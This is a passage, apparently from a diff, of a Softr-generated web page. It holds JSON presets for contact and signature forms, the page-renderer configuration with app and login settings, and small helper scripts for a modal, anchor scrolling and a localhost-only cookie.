size","value":null,"options":["S","M","L"],"fallback":{"key":"config.size","type":"THEME"},"controlType":"size"}],"expanded":false}],"caption":{"value":"","enabled":false},"isRequired":true,"placeholder":""},{"id":"id-text1","name":"","type":"text","label":{"icon":null,"value":"Label","tooltip":{"type":"text","label":"Tooltip","value":"","enabled":false,"required":false,"usePopover":true,"placeholder":"Optional","enabledToggleVariant":"plusMinus"}},"value":"Some text goes here.","styles":[{"type":"group","label":"Description","styles":[{"key":"description.color","type":"control","label":"Font color","value":null,"fallback":{"key":"tokens.colors.text.description","type":"THEME"},"controlType":"color"},{"key":"description.size","type":"control","label":"Font size","value":null,"options":["S","M","L"],"fallback":{"key":"config.size","type":"THEME"},"controlType":"size"}],"expanded":false}],"caption":{"value":"","enabled":false},"isRequired":true,"placeholder":""},{"id":"id-field1","name":"","type":"short_text","label":{"icon":null,"value":"Full name","tooltip":{"type":"text","label":"Tooltip","value":"","enabled":false,"required":false,"usePopover":true,"placeholder":"Optional","enabledToggleVariant":"plusMinus"}},"caption":{"value":"","enabled":false},"isRequired":true,"validation":{"max":{"validation":{"type":"number","label":"Max characters","value":150,"enabled":false,"required":false,"enabledToggleVariant":"plusMinus"},"errorMessage":{"type":"text","label":"Error message","value":"Please enter no more than {max_characters} characters","enabled":false,"required":true,"usePopover":true,"defaultValue":"Please enter no more than {max_characters} characters","requiredVariables":["{max_characters}"],"enabledToggleVariant":"arrow"}},"min":{"validation":{"type":"number","label":"Min characters","value":1,"enabled":false,"required":false,"enabledToggleVariant":"plusMinus"},"errorMessage":{"type":"text","label":"Error message","value":"Please enter at least {min_characters} characters","enabled":false,"required":true,"usePopover":true,"defaultValue":"Please enter at least {min_characters} characters","requiredVariables":["{min_characters}"],"enabledToggleVariant":"arrow"}},"custom":{"type":{"type":"select","label":"Custom validation","value":"NONE","options":["NONE","CUSTOM","REGEX"]},"regex":"","condition":"","errorMessage":{"type":"text","label":"Error message","value":"Please enter a valid value.","enabled":false,"required":true,"isTextarea":true,"usePopover":true,"defaultValue":"Please enter a valid value.","enabledToggleVariant":"arrow"}}},"placeholder":{"type":"text","label":"Placeholder","value":"Your name","enabled":false,"required":false,"enabledToggleVariant":"plusMinus"},"defaultValue":{"type":"text","label":"Default value","value":"","enabled":false,"required":false,"useVariables":true,"enabledToggleVariant":"plusMinus"}},{"id":"id-email","name":"","type":"email","label":{"icon":null,"value":"Email","tooltip":{"type":"text","label":"Tooltip","value":"","enabled":false,"required":false,"usePopover":true,"placeholder":"Optional","enabledToggleVariant":"plusMinus"}},"caption":{"value":"","enabled":false},"isRequired":true,"validation":{"custom":{"type":{"type":"select","label":"Custom validation","value":"NONE","options":["NONE","CUSTOM","REGEX"]},"regex":"","condition":"","errorMessage":{"type":"text","label":"Error message","value":"Please enter a valid email.","enabled":true,"required":true,"usePopover":true,"defaultValue":"Please enter a valid email.","useVariables":true,"enabledToggleVariant":"arrow"}},"emailDomainsAllowed":{"validation":{"info":"Use the email domain input we have in domain-restricted signup","type":"bubble","label":"Allow only specific email domains","value":"","enabled":false,"validator":"domain","placeholder":"","enabledToggleVariant":"plusMinus"},"errorMessage":{"type":"text","label":"Error message","value":"Domain not allowed","enabled":true,"required":true,"usePopover":true,"defaultValue":"Domain not allowed","useVariables":true,"enabledToggleVariant":"arrow"}},"invalidEmailMessage":{"info":"Message shown when the email format is invalid.","type":"text","label":"‘Invalid email’ message","value":"Please enter a valid email","enabled":true,"required":true,"usePopover":true,"defaultValue":"Please enter a valid email","useVariables":true,"enabledToggleVariant":"arrow"}},"placeholder":{"type":"text","label":"Placeholder","value":"name@example.com","required":false},"defaultValue":{"type":"text","label":"Default value","value":"","enabled":false,"required":false,"useVariables":true,"enabledToggleVariant":"plusMinus"}},{"id":"id-select","name":"","type":"auto_sync_dropdown","label":{"icon":null,"value":"Select","tooltip":{"type":"text","label":"Tooltip","value":"","enabled":false,"required":false,"usePopover":true,"placeholder":"Optional","enabledToggleVariant":"plusMinus"}},"values":"","caption":{"value":"","enabled":false},"condition":{"enabled":false,"expressions":[],"logicalOperator":"OR"},"isRequired":true,"multiSelect":false,"placeholder":"Select an option","optionsOrder":"ASC","multiRecordsLink":null,"allowCustomOptions":false,"syncWithDataSource":null},{"id":"id-quick-select","name":"","type":"quick_select","label":{"icon":null,"value":"Options","tooltip":{"type":"text","label":"Tooltip","value":"","enabled":false,"required":false,"usePopover":true,"placeholder":"Optional","enabledToggleVariant":"plusMinus"}},"values":"Option 1;Option 2;Option 3","caption":{"value":"","enabled":false},"condition":{"enabled":false,"expressions":[],"logicalOperator":"OR"},"isRequired":true,"multiSelect":false,"optionsOrder":"ASC","layoutOptions":["STACKED","FLOW","GRID"],"selectedLayout":"FLOW","multiRecordsLink":null,"syncWithDataSource":null},{"id":"id-date-time","name":"","type":"dateTime","label":{"icon":null,"value":"Date & time","tooltip":{"type":"text","label":"Tooltip","value":"","enabled":false,"required":false,"usePopover":true,"placeholder":"Optional","enabledToggleVariant":"plusMinus"}},"caption":{"value":"","enabled":false},"isRequired":true,"placeholder":"Select a date"}],"conditions":{"visibility":"ALWAYS_VISIBLE","expressions":[],"logicalOperator":"AND"}}],"conditions":[{"id":"path1","targetStep":"ending1","expressions":[],"logicalOperator":"OR"}]}],"endings":[{"id":"ending1","name":"Ending 1","type":"SUCCESS_MESSAGE","action":"REFRESH","successMessage":"Thank you for submitting the form!","workflowConfigs":{"triggerId":"","workflowId":""}}],"reCaptcha":{"type":"toggle","enabled":false},"nextButton":{"icon":"","label":"Next"},"prevButton":{"icon":"","label":"Previous"},"skipButton":{"icon":"","label":"Skip"},"allowToSkip":false,"sideSection":{"text":{"value":"Something less important","enabled":false},"image":{"value":"https://assets.softr-files.com/assets/blocks/v5/mock-images/abstract/05.jpg","enabled":false},"order":["heading","text","image","video"],"video":{"value":"https://youtu.be/0PahaXE5cVY?si=tj37ogj4scsYWc8N","enabled":false,"thumbnailSrc":"https://assets.softr-files.com/assets/blocks/v5/mock-images/abstract/01.jpg"},"enabled":false,"heading":{"value":"Something important","enabled":false,"variant":"title"},"backgroundImage":"https://assets.softr-files.com/assets/blocks/v5/mock-images/abstract/02.jpg"},"submitButton":{"icon":"","label":"Submit"}}}},"previewImage":"https://assets.softr-files.com/assets/blocks/studio/conditional-form/centered-preset-thumbnail.svg"},{"name":"sideText","image":"https://assets.softr-files.com/assets/blocks/studio/conditional-form/side-text-preset-thumbnail.svg","title":"Side text","properties":{"elements":{"form":{"steps":[{"id":"step1","name":"Step 1","header":{"image":{"url":""}},"sections":[{"id":"step1-s1","name":"Section 1","fields":[{"id":"id-field1","name":"","type":"short_text","label":{"icon":null,"value":"Full name","tooltip":{"type":"text","label":"Tooltip","value":"","enabled":false,"required":false,"usePopover":true,"placeholder":"Optional","enabledToggleVariant":"plusMinus"}},"caption":{"value":"","enabled":false},"isRequired":true,"validation":{"max":{"validation":{"type":"number","label":"Max characters","value":150,"enabled":false,"required":false,"enabledToggleVariant":"plusMinus"},"errorMessage":{"type":"text","label":"Error message","value":"Please enter no more than {max_characters} characters","enabled":false,"required":true,"usePopover":true,"defaultValue":"Please enter no more than {max_characters} characters","requiredVariables":["{max_characters}"],"enabledToggleVariant":"arrow"}},"min":{"validation":{"type":"number","label":"Min characters","value":1,"enabled":false,"required":false,"enabledToggleVariant":"plusMinus"},"errorMessage":{"type":"text","label":"Error message","value":"Please enter at least {min_characters} characters","enabled":false,"required":true,"usePopover":true,"defaultValue":"Please enter at least {min_characters} characters","requiredVariables":["{min_characters}"],"enabledToggleVariant":"arrow"}},"custom":{"type":{"type":"select","label":"Custom validation","value":"NONE","options":["NONE","CUSTOM","REGEX"]},"regex":"","condition":"","errorMessage":{"type":"text","label":"Error message","value":"Please enter a valid value.","enabled":false,"required":true,"isTextarea":true,"usePopover":true,"defaultValue":"Please enter a valid value.","enabledToggleVariant":"arrow"}}},"placeholder":{"type":"text","label":"Placeholder","value":"Your name","enabled":false,"required":false,"enabledToggleVariant":"plusMinus"},"defaultValue":{"type":"text","label":"Default value","value":"","enabled":false,"required":false,"useVariables":true,"enabledToggleVariant":"plusMinus"}},{"id":"id-long-text","name":"","type":"long_text","label":{"icon":null,"value":"Text","tooltip":{"type":"text","label":"Tooltip","value":"","enabled":false,"required":false,"usePopover":true,"placeholder":"Optional","enabledToggleVariant":"plusMinus"}},"caption":{"value":"","enabled":false},"richText":{"type":"boolean","label":"Rich text formatting","value":false,"enabled":true},"isRequired":true,"validation":{"max":{"validation":{"type":"number","label":"Max characters","value":500,"enabled":false,"required":false,"enabledToggleVariant":"plusMinus"},"errorMessage":{"type":"text","label":"Error message","value":"Please enter no more than 500 characters","enabled":false,"required":true,"usePopover":true,"defaultValue":"Please enter no more than {max_characters} characters","requiredVariables":["{max_characters}"],"enabledToggleVariant":"arrow"}},"min":{"validation":{"type":"number","label":"Min characters","value":0,"enabled":false,"required":false,"enabledToggleVariant":"plusMinus"},"errorMessage":{"type":"text","label":"Error message","value":"Please enter at least {min_characters} characters","enabled":false,"required":true,"usePopover":true,"defaultValue":"Please enter at least {min_characters} characters","requiredVariables":["{min_characters}"],"enabledToggleVariant":"arrow"}},"custom":{"type":{"type":"select","label":"Custom validation","value":"NONE","options":["NONE","CUSTOM","REGEX"]},"regex":"","condition":"","errorMessage":{"type":"text","label":"Error message","value":"Please enter a valid value.","enabled":false,"required":true,"isTextarea":true,"usePopover":true,"defaultValue":"Please enter a valid value.","enabledToggleVariant":"arrow"}}},"placeholder":{"type":"text","label":"Placeholder","value":"Type in something here...","enabled":true,"required":false,"enabledToggleVariant":"plusMinus"},"defaultValue":{"type":"text","label":"Default value","value":"","enabled":false,"required":false,"useVariables":true,"enabledToggleVariant":"plusMinus"}},{"id":"id-phone","name":"","type":"phone_number","label":{"icon":null,"value":"Phone number","tooltip":{"type":"text","label":"Tooltip","value":"","enabled":false,"required":false,"usePopover":true,"placeholder":"Optional","enabledToggleVariant":"plusMinus"}},"caption":{"value":"","enabled":false},"options":{"country":{"type":"countrySelect","label":"Country","value":"US"},"useLocalFormat":{"type":"boolean","label":"Use local format","value":false},"fixedCountryCode":{"type":"boolean","label":"Fixed country code","value":false}},"isRequired":true,"validation":{"custom":{"type":{"type":"select","label":"Custom validation","value":"NONE","options":["NONE","CUSTOM","REGEX"]},"regex":"","condition":"","errorMessage":{"type":"text","label":"Error message","value":"Please enter a valid phone number","enabled":false,"required":true,"isTextarea":true,"usePopover":true,"defaultValue":"Please enter a valid phone number","enabledToggleVariant":"arrow"}},"invalidPhoneNumberMessage":{"info":"Message shown when the phone number format is invalid.","type":"text","label":"‘Invalid phone number’ message","value":"Please enter a valid phone number","enabled":false,"required":true,"isTextarea":true,"usePopover":true,"defaultValue":"Please enter a valid phone number","enabledToggleVariant":"arrow"}},"placeholder":{"type":"text","label":"Placeholder","value":"Your phone number","enabled":false,"required":false,"enabledToggleVariant":"plusMinus"},"defaultValue":{"type":"text","label":"Default value","value":"","enabled":false,"required":false,"isTextarea":true,"useVariables":true,"enabledToggleVariant":"plusMinus"}}],"conditions":{"visibility":"ALWAYS_VISIBLE","expressions":[],"logicalOperator":"AND"}}],"conditions":[{"id":"path1","targetStep":"ending1","expressions":[],"logicalOperator":"OR"}]}],"endings":[{"id":"ending1","name":"Ending 1","type":"SUCCESS_MESSAGE","action":"REFRESH","successMessage":"Thank you for submitting the form!","workflowConfigs":{"triggerId":"","workflowId":""}}],"reCaptcha":{"type":"toggle","enabled":false},"nextButton":{"icon":"","label":"Next"},"prevButton":{"icon":"","label":"Previous"},"skipButton":{"icon":"","label":"Skip"},"allowToSkip":false,"sideSection":{"text":{"value":"Have questions about pricing, plans, or our Awesome Product? Fill out the form and a sales representative will be in touch shortly.","enabled":true},"image":{"value":"https://assets.softr-files.com/assets/blocks/v5/mock-images/abstract/05.jpg","enabled":false},"order":["heading","text","image","video"],"video":{"value":"","enabled":false,"thumbnailSrc":""},"enabled":true,"heading":{"value":"Talk to a sales representative","enabled":true,"variant":"title"},"backgroundImage":"https://assets.softr-files.com/assets/blocks/v5/mock-images/abstract/07.jpg"},"submitButton":{"icon":"","label":"Submit"}}}},"previewImage":"https://assets.softr-files.com/assets/blocks/studio/conditional-form/side-text-preset-thumbnail.svg"},{"name":"sideVideo","image":"https://assets.softr-files.com/assets/blocks/studio/conditional-form/side-video-preset-thumbnail.svg","title":"Side video","properties":{"elements":{"form":{"steps":[{"id":"step1","name":"Step 1","header":{"image":{"url":""}},"sections":[{"id":"step1-s1","name":"Section 1","fields":[{"id":"id-heading2","name":"","type":"heading2","label":{"icon":null,"value":"Label","tooltip":{"type":"text","label":"Tooltip","value":"","enabled":false,"required":false,"usePopover":true,"placeholder":"Optional","enabledToggleVariant":"plusMinus"}},"value":"Please sign here","styles":[{"type":"group","label":"Title","styles":[{"key":"title.color","type":"control","label":"Font color","value":null,"fallback":{"key":"tokens.colors.text.heading","type":"THEME"},"controlType":"color"},{"key":"title.size","type":"control","label":"Font size","value":null,"options":["S","M","L"],"fallback":{"key":"config.size","type":"THEME"},"controlType":"size"}],"expanded":false}],"caption":{"value":"","enabled":false},"isRequired":true,"placeholder":""},{"id":"id-email","name":"","type":"email","label":{"icon":null,"value":"Email","tooltip":{"type":"text","label":"Tooltip","value":"","enabled":false,"required":false,"usePopover":true,"placeholder":"Optional","enabledToggleVariant":"plusMinus"}},"caption":{"value":"","enabled":false},"isRequired":true,"validation":{"custom":{"type":{"type":"select","label":"Custom validation","value":"NONE","options":["NONE","CUSTOM","REGEX"]},"regex":"","condition":"","errorMessage":{"type":"text","label":"Error message","value":"Please enter a valid email.","enabled":true,"required":true,"usePopover":true,"defaultValue":"Please enter a valid email.","useVariables":true,"enabledToggleVariant":"arrow"}},"emailDomainsAllowed":{"validation":{"info":"Use the email domain input we have in domain-restricted signup","type":"bubble","label":"Allow only specific email domains","value":"","enabled":false,"validator":"domain","placeholder":"","enabledToggleVariant":"plusMinus"},"errorMessage":{"type":"text","label":"Error message","value":"Domain not allowed","enabled":true,"required":true,"usePopover":true,"defaultValue":"Domain not allowed","useVariables":true,"enabledToggleVariant":"arrow"}},"invalidEmailMessage":{"info":"Message shown when the email format is invalid.","type":"text","label":"‘Invalid email’ message","value":"Please enter a valid email","enabled":true,"required":true,"usePopover":true,"defaultValue":"Please enter a valid email","useVariables":true,"enabledToggleVariant":"arrow"}},"placeholder":{"type":"text","label":"Placeholder","value":"Your email","required":false},"defaultValue":{"type":"text","label":"Default value","value":"","enabled":false,"required":false,"useVariables":true,"enabledToggleVariant":"plusMinus"}},{"id":"id-signature","name":"","type":"signature","label":{"icon":null,"value":"Signature","tooltip":{"type":"text","label":"Tooltip","value":"","enabled":false,"required":false,"usePopover":true,"placeholder":"Optional","enabledToggleVariant":"plusMinus"}},"caption":{"value":"","enabled":false},"isRequired":true,"placeholder":"Sign here"},{"id":"id-checkbox","name":"","type":"checkbox","label":{"icon":null,"value":"I have read T&C","tooltip":{"type":"text","label":"Tooltip","value":"","enabled":false,"required":false,"usePopover":true,"placeholder":"Optional","enabledToggleVariant":"plusMinus"}},"isRequired":true,"placeholder":{"type":"text","label":"Description","value":"Please check this box","required":false,"useVariables":true},"defaultValue":{"type":"boolean","label":"Checked by default","value":false,"enabled":true}}],"conditions":{"visibility":"ALWAYS_VISIBLE","expressions":[],"logicalOperator":"AND"}}],"conditions":[{"id":"path1","targetStep":"ending1","expressions":[],"logicalOperator":"OR"}]}],"endings":[{"id":"ending1","name":"Ending 1","type":"SUCCESS_MESSAGE","action":"REFRESH","successMessage":"Thank you for submitting the form!","workflowConfigs":{"triggerId":"","workflowId":""}}],"reCaptcha":{"type":"toggle","enabled":false},"nextButton":{"icon":"","label":"Next"},"prevButton":{"icon":"","label":"Previous"},"skipButton":{"icon":"","label":"Skip"},"allowToSkip":false,"sideSection":{"text":{"value":"Have questions about pricing, plans, or our Awesome Product? Fill out the form and a sales representative will be in touch shortly.","enabled":false},"image":{"value":"https://assets.softr-files.com/assets/blocks/v5/mock-images/abstract/05.jpg","enabled":false},"order":["heading","text","image","video"],"video":{"value":"https://youtu.be/0PahaXE5cVY?si=tj37ogj4scsYWc8N","enabled":true,"thumbnailSrc":"https://assets.softr-files.com/assets/blocks/v5/mock-images/abstract/01.jpg"},"enabled":true,"heading":{"value":"Talk to a sales representative","enabled":false,"variant":"title"},"backgroundImage":"https://assets.softr-files.com/assets/blocks/v5/mock-images/abstract/07.jpg"},"submitButton":{"icon":"","label":"Submit"}}}},"previewImage":"https://assets.softr-files.com/assets/blocks/studio/conditional-form/side-video-preset-thumbnail.svg"},{"name":"singleQuestion","image":"https://assets.softr-files.com/assets/blocks/studio/conditional-form/single-question-preset-thumbnail.svg","title":"Single question","properties":{"elements":{"form":{"steps":[{"id":"step1","name":"Step 1","header":{"image":{"url":""}},"sections":[{"id":"step1-s1","name":"Section 1","fields":[{"id":"id-heading1","name":"","type":"heading1","label":{"icon":null,"value":"Label","tooltip":{"type":"text","label":"Tooltip","value":"","enabled":false,"required":false,"usePopover":true,"placeholder":"Optional","enabledToggleVariant":"plusMinus"}},"value":"Question","styles":[{"type":"group","label":"Title","styles":[{"key":"title.color","type":"control","label":"Font color","value":null,"fallback":{"key":"tokens.colors.text.heading","type":"THEME"},"controlType":"color"},{"key":"title.size","type":"control","label":"Font size","value":null,"options":["S","M","L"],"fallback":{"key":"config.size","type":"THEME"},"controlType":"size"}],"expanded":false}],"caption":
+  {"value":"","enabled":false},"isRequired":true,"placeholder":""},{"id":"id-text1","name":"","type":"text","label":{"icon":null,"value":"Label","tooltip":{"type":"text","label":"Tooltip","value":"","enabled":false,"required":false,"usePopover":true,"placeholder":"Optional","enabledToggleVariant":"plusMinus"}},"value":"Some text goes here.","styles":[{"type":"group","label":"Description","styles":[{"key":"description.color","type":"control","label":"Font color","value":null,"fallback":{"key":"tokens.colors.text.description","type":"THEME"},"controlType":"color"},{"key":"description.size","type":"control","label":"Font size","value":null,"options":["S","M","L"],"fallback":{"key":"config.size","type":"THEME"},"controlType":"size"}],"expanded":false}],"caption":{"value":"","enabled":false},"isRequired":true,"placeholder":""},{"id":"id-field1","name":"","type":"short_text","label":{"icon":null,"value":"Full name","tooltip":{"type":"text","label":"Tooltip","value":"","enabled":false,"required":false,"usePopover":true,"placeholder":"Optional","enabledToggleVariant":"plusMinus"}},"caption":{"value":"","enabled":false},"isRequired":true,"validation":{"max":{"validation":{"type":"number","label":"Max characters","value":150,"enabled":false,"required":false,"enabledToggleVariant":"plusMinus"},"errorMessage":{"type":"text","label":"Error message","value":"Please enter no more than {max_characters} characters","enabled":false,"required":true,"usePopover":true,"defaultValue":"Please enter no more than {max_characters} characters","requiredVariables":["{max_characters}"],"enabledToggleVariant":"arrow"}},"min":{"validation":{"type":"number","label":"Min characters","value":1,"enabled":false,"required":false,"enabledToggleVariant":"plusMinus"},"errorMessage":{"type":"text","label":"Error message","value":"Please enter at least {min_characters} characters","enabled":false,"required":true,"usePopover":true,"defaultValue":"Please enter at least {min_characters} characters","requiredVariables":["{min_characters}"],"enabledToggleVariant":"arrow"}},"custom":{"type":{"type":"select","label":"Custom validation","value":"NONE","options":["NONE","CUSTOM","REGEX"]},"regex":"","condition":"","errorMessage":{"type":"text","label":"Error message","value":"Please enter a valid value.","enabled":false,"required":true,"isTextarea":true,"usePopover":true,"defaultValue":"Please enter a valid value.","enabledToggleVariant":"arrow"}}},"placeholder":{"type":"text","label":"Placeholder","value":"Your name","enabled":false,"required":false,"enabledToggleVariant":"plusMinus"},"defaultValue":{"type":"text","label":"Default value","value":"","enabled":false,"required":false,"useVariables":true,"enabledToggleVariant":"plusMinus"}}],"conditions":{"visibility":"ALWAYS_VISIBLE","expressions":[],"logicalOperator":"AND"}}],"conditions":[{"id":"path1","targetStep":"ending1","expressions":[],"logicalOperator":"OR"}]}],"endings":[{"id":"ending1","name":"Ending 1","type":"SUCCESS_MESSAGE","action":"REFRESH","successMessage":"Thank you for submitting the form!","workflowConfigs":{"triggerId":"","workflowId":""}}],"reCaptcha":{"type":"toggle","enabled":false},"nextButton":{"icon":"","label":"Next"},"prevButton":{"icon":"","label":"Previous"},"skipButton":{"icon":"","label":"Skip"},"allowToSkip":false,"sideSection":{"text":{"value":"Have questions about pricing, plans, or our Awesome Product? Fill out the form and a sales representative will be in touch shortly.","enabled":false},"image":{"value":"https://assets.softr-files.com/assets/blocks/v5/mock-images/abstract/05.jpg","enabled":false},"order":["heading","text","image","video"],"video":{"value":"https://youtu.be/0PahaXE5cVY?si=tj37ogj4scsYWc8N","enabled":false,"thumbnailSrc":"https://assets.softr-files.com/assets/blocks/v5/mock-images/abstract/01.jpg"},"enabled":true,"heading":{"value":"Talk to a sales representative","enabled":false,"variant":"title"},"backgroundImage":"https://assets.softr-files.com/assets/blocks/v5/mock-images/abstract/07.jpg"},"submitButton":{"icon":"","label":"Submit"}}}},"previewImage":"https://assets.softr-files.com/assets/blocks/studio/conditional-form/single-question-preset-thumbnail.svg"}],"activePreset":"centered"},"created_at":"2026-03-02T09:31:52.525"}];
+softrBlocks.forEach(function(block) {
+  var blockUniqueName = block.id.replace(/-/g, '');
+  window['block_' + blockUniqueName + '_defJson'] = block;
+  window['block_' + blockUniqueName + '_defJson']['defaultTheme'] = reactDefaultThemes;
+});
+SoftrPageRenderer.render({blocks: softrBlocks, targetElement: document.getElementById('page-content'), workspaceId: "83f2ac9e-a0fe-43b2-b5a8-fd9982acff75", appId: "1c5cbd69-6036-4f3f-be0b-fb7860be3d46", pageId: "a6a1dcd4-091e-46c1-ae62-dee74abbfe29", showMadeWithBadge: false, badgeType: "FLOATING_BADGE", aiApp: false, paymentPlan: "price_1PmrXeIWZwIztnHlAGyfJOQI", baseUrl: "https://assets.softr-files.com/softr-blocks/prod/blocks", theme: reactDefaultThemes, appCustomHeaderCode: "", pageCustomHeaderCode: "", appCustomFooterCode: "", pageCustomFooterCode: "", featureFlags: {"navigationLayout": true, "fixedBlockRoots": true, "universalDSForAirtable": true, }, context: {"application_context": {"application_logo":{"type":"IMAGE","icon":{"logo":"","text":""},"image":{"horizontal":"","square":"https://assets.softr-files.com/applications/1c5cbd69-6036-4f3f-be0b-fb7860be3d46/assets/517e50db-ab40-4b43-a2fa-d530bc70619b.png"}},"date_and_time_settings":{"format_settings":{"type":"LOCAL","local_settings":{"localize_day_and_month":true},"fixed_settings":null},"timezone_settings":{"type":"LOCAL","fixed_timezone":null}},"number_formatting_settings":{"type":"LOCAL","fixed_locale":"en-US"},"global_search_settings":{"enabled":true,"search_placeholder":"Search","initial_state_message":"Type something to start searching","initial_state_image":null,"no_results_message":"No results found","no_results_image":null,"backdrop":null},"user_settings":{"auth_settings":{"login_enabled":true,"authentication_methods":["EMAIL"],"sign_up_settings":{"policy":"DISABLED","allowed_domains":[]},"user_session_expiration":"90_DAYS","user_inactivity_timeout":"NEVER","email_auth_settings":{"login_methods":["PASSWORD"],"password_settings":{"input_label":"Password","input_placeholder":"Enter your password","forgot_password_text":"Forgot password","incorrect_password_text":"Incorrect password.","new_password_label":"New password","new_password_placeholder":"Set a secure password","strong_passwords":true,"minimum_characters_text":"At least 12 characters","upper_and_lower_case_text":"1 uppercase & 1 lowercase","number_text":"1 number (0-9)","symbol_text":"1 symbol (!@#$%^&*)","repeat_password_label":"Repeat password","repeat_password_placeholder":"Repeat your password","passwords_dont_match_text":"Passwords don't match."},"email_one_time_code_settings":{"expiration":"5_MINUTES","input_label":"Verification code","input_placeholder":"Enter verification code","resend_text":"Resend","invalid_code_text":"Invalid code."},"secondary_login_methods":[],"sms_one_time_code_settings":null,"authenticator_settings":null,"input_label":"Email","input_placeholder":"Enter your email"},"google_settings":{"client_id":null,"client_secret":null,"user_type":"INTERNAL","email_domains":[]},"sso_settings":{"type":"SAML","email_domains":[],"saml":{"acs_url":null,"audience_url":null,"metadata_xml":null,"email_key":null,"first_name_key":null,"last_name_key":null},"open_id":{"callback_url":null,"provider_url":null,"token_service_url":null,"client_id":null,"client_secret":null}}},"auto_invite":false},"user_connection":{"datasource":{"id":"b9292fd6-14c3-4e3b-965f-a256dcebf64a","datasource_integration_type":"SOFTR_TABLES"},"attributes":{"tablespaceId":"0889fed5-1ea7-42d9-920a-9c1eebfc0c3c","nameFieldName":"o0JWv","emailFieldName":"c63tL"}},"user_group_redirection":null,"polling_configs":{"datasources":{"SQL_SERVER":8000,"MYSQL":8000,"MARIADB":8000,"XANO_SQL":8000,"GOOGLE_SHEET":8000,"SUPABASE":8000,"NOTION":8000,"SMARTSUITE":8000,"MONDAY":8000,"SOFTR_TABLES":8000,"CLICKUP":8000,"CODA":8000,"AIRTABLE":8000,"POSTGRESQL":8000},"defaultPollingInterval":10000},"comment_settings":{"general_settings":{"allow_mentions":false,"allow_attachments":true,"rich_text_formatting":false,"block_display_settings":{"sort_direction":"OLDEST_ON_TOP","surface":false,"show_vertical_line":false},"side_panel_display_settings":{"sort_direction":"OLDEST_ON_TOP","surface":false,"show_vertical_line":false,"comment_panel_display_mode":"COVER_MAIN_CONTENT"},"keep_comments_for_inactive_users":true,"comment_deletion_user_groups":[]},"message_settings":{"comment_list_title":"Comments","comment_box_placeholder":"Leave a comment...","notifications_toggle_label":"Notifications","submit_button":{"label":"Submit","icon":""},"cancel_button":{"label":"Cancel","icon":""},"edit_button":{"label":"Edit","icon":"edit-02"},"delete_button":{"label":"Delete","icon":"trash-01"},"load_more_comments_button":{"label":"Load more comments","icon":""},"empty_state_message":"No comments yet","edited_comment_indicator":"(edited)"},"mention_permissions":[],"comment_block_settings":[]},"spa_mode_enabled":true}}}).then(() => window.dispatchEvent(new Event("@softr/page-content-loaded")));
+
+</script>
+
+
+<script src="https://assets.softr-files.com/libs/iframe-resizer/4.2.11/iframeResizer.contentWindow.min.js" crossorigin="anonymous"></script>
+
+<!-- Localhost -->
+<script type="text/javascript">
+    if (window.location.hostname === 'localhost') {
+        if (getUrlParam('domain')) {
+            setCookie('serverName', getUrlParam('domain'), 30);
+        }
+    }
+
+    function setCookie(name, value, days) {
+        var date = new Date();
+        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+        var expires = "expires=" + date.toUTCString();
+        document.cookie = name + "=" + value + ";" + expires + ";path=/;" + "SameSite=None; Secure";
+    }
+
+    function getUrlParam(name) {
+        const url = new URL(window.location.href);
+        let param;
+        for (var key of url.searchParams.keys()) {
+            if (key.toLowerCase() === name.toLowerCase()) {
+                param = url.searchParams.get(name);
+                break;
+            }
+        }
+        return param;
+    }
+</script>
+
+<!-- Modal HTML -->
+<div id="sw-modal" class="sw-modal" aria-hidden="true">
+    <div class="sw-modal-overlay" data-micromodal-close>
+        <div tabindex="-1" class="sw-modal-container">
+            <div role="dialog" aria-modal="true" aria-labelledby="micromodal-title">
+                <button aria-label="Close modal" class="sw-modal-close" onclick="MicroModal.close('sw-modal')"></button>
+                <div id="sw-modal-content">
+                    <iframe class="sw-modal-iframe"></iframe>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!--Scroll to section-->
+<script>
+
+    window.addEventListener(BlocksRenderedEventName, function () {
+        $('a').each(function (index, el) {
+            let href = $(el).attr('href');
+            let path = cleanSlugFromPath(location.pathname);
+            if (href && href.startsWith(path + '#')) {
+                const scrollTo = href.split('#')[1];
+                $(this).attr('href', '#' + scrollTo);
+            }
+        });
+
+        function cleanSlugFromPath(pagePath) {
+            if (pagePath.includes("/r/rec")) {
+                pagePath = pagePath.substring(0, pagePath.indexOf("/r/rec"));
+                pagePath = pagePath.substring(0, pagePath.lastIndexOf("/"));
+            }
+
+            return pagePath + (pagePath.endsWith('/') ? '' : '/');
+        }
+    });
+
+</script>
+
+</body>
+
+</html>
